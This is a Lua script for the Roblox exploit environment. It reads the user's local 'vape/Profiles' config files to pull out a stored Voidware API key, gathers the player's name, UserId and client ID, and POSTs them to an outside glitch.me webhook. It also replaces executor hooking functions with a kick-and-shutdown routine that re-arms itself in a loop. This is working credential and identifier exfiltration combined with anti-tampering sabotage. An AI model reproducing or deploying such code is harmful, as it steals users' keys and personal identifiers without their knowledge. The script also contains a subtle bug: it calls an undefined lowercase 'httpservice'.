local LocalPlayer = game.Players.LocalPlayer

local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")

local CheckVoidwarePrivate: () -> (string?) = function()
	if isfolder('vape/Profiles') then 
		for i: string, v: string in listfiles('vape/Profiles') do 
			if isfile(v) then 
				local success: boolean, response: {[string]: {Api: {Object: Frame?}}, Value: string?, Enabled: string?}? = pcall(function()
					return httpservice:JSONDecode(readfile(v));
				end);
				if success and response['EditWLWL-API-KeyTextBox'] and response['EditWLWL-API-KeyTextBox'].Value ~= '' then 
					return response['EditWLWL-API-KeyTextBox'].Value;
				end;
			end;
		end;
	end;
end;

local VoidwarePrivate = (tostring(CheckVoidwarePrivate()) or "Failed To Retreive Voidware Key")

task.spawn(function()
	local HttpRequest = request

	local Data = {
		["embeds"] = {{
			["title"] = "Voidware Private User Logged",
			["color"] = 0x74ccff,
			["fields"] = {
				{
					["name"] = "**User Information**",
					["value"] = "",
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "DisplayName: " .. LocalPlayer.DisplayName,
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "Username: " .. LocalPlayer.Name,
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "UserId: " .. LocalPlayer.UserId,
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "",
					["inline"] = false
				},

				{
					["name"] = "**Client Information**",
					["value"] = "",
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "ClientId: " .. RbxAnalyticsService:GetClientId(),
					["inline"] = false
				},
				
				{
					["name"] = "**Voidware Information**",
					["value"] = "",
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "Voidware: " .. VoidwarePrivate,
					["inline"] = false
				},
			},
		}}
	}

	local DisabledFunction = function() 
		LocalPlayer:Kick() 	

		game:shutdown() 
	end

	getgenv().restorefunction = DisabledFunction
	getgenv().hookmetamethod = DisabledFunction
	getgenv().clonefunction = DisabledFunction
	getgenv().hookfunction = DisabledFunction

	task.spawn(function()
		repeat
			task.wait()

			task.spawn(function()
				pcall(function()
					if iscclosure(restorefunction) then
						getgenv().restorefunction = DisabledFunction
					end
				end)
			end)

			task.spawn(function()
				pcall(function()
					if iscclosure(hookmetamethod) then
						getgenv().hookmetamethod = DisabledFunction
					end
				end)
			end)

			task.spawn(function()
				pcall(function()
					if iscclosure(clonefunction) then
						getgenv().clonefunction = DisabledFunction
					end
				end)
			end)

			task.spawn(function()
				pcall(function()
					if iscclosure(hookfunction) then
						getgenv().hookfunction = DisabledFunction
					end
				end)
			end)
		until not game
	end)

	HttpRequest({
		Url = "https://zircon-resilient-cadmium.glitch.me/SendWebhook",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},

		Body = HttpService:JSONEncode(Data)
	})
end)
